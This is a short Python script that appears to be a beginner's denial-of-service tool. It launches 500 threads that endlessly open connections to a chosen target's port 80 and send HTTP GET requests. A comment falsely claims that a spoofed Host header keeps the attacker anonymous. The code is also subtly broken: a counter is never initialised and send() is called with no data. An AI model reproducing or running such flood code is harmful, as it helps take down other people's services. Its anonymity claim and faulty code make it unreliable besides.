import threading
import socket

target=''   #Choose Target
port=80
fake_ip=''  #To Keep You Anonymous

#Disclaimer: This method does not make you invisible, it can be detected by stronger tools

def attack():
    while True:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        
        s.connect((target,port))
        s.sendto(('GET /'+target+' HTTP/1.1\r\n').encode('ascii'),(target,port))
        s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target,port))
        s.send()

        global already_connected
        already_connected+=1
        print(already_connected)

for i in range(500):
    thread=threading.Thread(target=attack)
    thread.start()